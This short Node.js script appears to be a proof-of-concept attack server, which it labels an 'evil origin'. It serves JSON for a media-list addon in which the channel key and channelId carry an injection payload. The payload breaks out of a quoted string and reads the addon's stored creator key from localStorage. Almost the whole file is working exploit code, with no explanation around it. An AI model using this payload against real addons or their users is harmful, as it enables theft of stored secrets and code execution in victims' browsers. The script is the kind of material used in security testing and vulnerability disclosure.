import http from "node:http";
const PAY = '"); window.__pwned = "KEY=" + localStorage.getItem("myListAddon:creatorKey"); //';
http.createServer((req, res) => {
  res.setHeader("access-control-allow-origin", "*");
  res.setHeader("content-type", "application/json");
  res.end(JSON.stringify({
    ok: true,
    entries: [{ name: "My Sci-Fi Shelf", url: "https://mdblist.com/lists/x/y", type: "movie", enabled: true }],
    channels: { [PAY]: { channelId: PAY, name: "Sci-Fi Marathon", type: "series",
      items: [{ id: "tt0944947", type: "series", name: "Ep", showName: "S", seasonNum: 1, episodeNum: 1 }] } },
  }));
}).listen(9999, "127.0.0.1", () => console.log("evil origin on 9999"));
